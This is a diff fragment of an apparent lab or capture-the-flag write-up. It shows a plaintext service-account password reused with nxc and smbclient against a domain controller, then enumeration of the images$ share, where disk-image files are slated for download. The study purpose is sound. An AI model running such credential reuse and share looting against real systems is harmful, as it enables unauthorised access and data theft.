@@ -185,6 +185,8 @@ svc_autojoin:K5&A6Dw9d8jrKWhV
 ```
 Ill test these creds
 
+# Compromising `svc_autojoin`
+
 ```python
 nxc smb AWSJPDC0522.shibuya.vl -u 'svc_autojoin' -p 'K5&A6Dw9d8jrKWhV'  
 SMB         10.129.234.42   445    AWSJPDC0522      [*] Windows Server 2022 Build 20348 x64 (name:AWSJPDC0522) (domain:shibuya.vl) (signing:True) (SMBv1:None) (Null Auth:True)
@@ -208,6 +210,22 @@ SMB         10.129.234.42   445    AWSJPDC0522      SYSVOL          READ        
 SMB         10.129.234.42   445    AWSJPDC0522      users           READ 
 ```
 This user has access to the `images$` share
+
+```
+smbclient \\\\AWSJPDC0522.shibuya.vl\\images$ -U 'svc_autojoin'%'K5&A6Dw9d8jrKWhV'                            
+Try "help" to get a list of possible commands.
+smb: \> ls
+  .                                   D        0  Sun Feb 16 11:24:08 2025
+  ..                                DHS        0  Wed Apr  9 01:09:45 2025
+  AWSJPWK0222-01.wim                  A  8264070  Sun Feb 16 11:23:41 2025
+  AWSJPWK0222-02.wim                  A 50660968  Sun Feb 16 11:23:45 2025
+  AWSJPWK0222-03.wim                  A 32065850  Sun Feb 16 11:23:47 2025
+  vss-meta.cab                        A   365686  Sun Feb 16 11:22:37 2025
+
+		5048575 blocks of size 4096. 1565210 blocks available
+smb: \> 
+```
+Found some .wim files which ill transfer to my machine
 
 
 
